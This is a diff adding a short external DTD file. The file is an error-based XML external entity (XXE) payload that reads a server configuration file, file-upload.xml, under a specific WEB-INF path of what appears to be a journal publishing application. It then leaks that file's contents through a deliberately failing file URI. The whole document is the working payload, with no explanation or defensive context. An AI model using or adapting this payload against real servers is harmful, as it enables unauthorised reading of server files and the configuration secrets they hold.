@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///d:/magtech/journalx_dzkjqb/WEB-INF/classes/file-upload.xml">
+<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///GG%file;'>">
+%eval;
+%err;
